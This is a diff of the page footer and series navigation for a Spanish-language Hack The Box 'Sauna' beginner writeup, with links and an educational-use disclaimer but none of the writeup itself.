-  <div><span class="g">iphobiuss@offsec</span>:~$ <span class="mono">echo "de un chiste en el HTML a Domain Admin: la web tambien es superficie."</span></div>
-  <div>Sauna · Hack The Box · máquina retirada · guía para principiantes · #5 de la serie · segunda AD</div>
-  <div>
-    <a href="index.html">Knowledge base</a> ·
-    <a href="forest.html">← Forest</a> ·
-    <a href="https://github.com/iphobiuss" target="_blank" rel="noopener">GitHub</a> ·
-    <a href="https://www.linkedin.com/in/sebastian-latorre-munoz/" target="_blank" rel="noopener">LinkedIn</a>
-  </div>
-  <div class="rev">Sebastián Latorre Muñoz · Santiago, CL</div>
-</footer>
-</body>
-</html>
+<nav class="series-nav" aria-label="Navegación por la serie"><a href="vaccine.html"><small>ANTERIOR · GUÍA 04</small><span>← Vaccine</span></a><a href="cascade.html"><small>SIGUIENTE · GUÍA 06</small><span>Cascade →</span></a></nav></div></div></main><footer class="footer"><div class="shell"><div class="footer-top"><div><a class="brand" href="index.html">iphobiuss<span>::offsec</span></a><p>Sebastián Latorre Muñoz · Santiago, Chile</p></div><div class="footer-links"><a href="fundamentos.html">Fundamentos</a><a href="fundamentos.html#glosario">Glosario</a><a href="https://github.com/iphobiuss" rel="noopener noreferrer" target="_blank">GitHub</a><a href="https://www.linkedin.com/in/sebastian-latorre-munoz/" rel="noopener noreferrer" target="_blank">LinkedIn</a><button class="small-button js-only" data-retro-toggle aria-pressed="false" type="button" hidden>Efectos retro</button></div></div><div class="footer-note">Material educativo para laboratorios y evaluaciones autorizadas. La base de técnicas utiliza ejemplos genéricos; los writeups documentan laboratorios de práctica de HTB. No son informes ni soluciones de exámenes de certificación.</div></div></footer><p id="action-status" class="sr-only" role="status" aria-live="polite"></p></body></html>
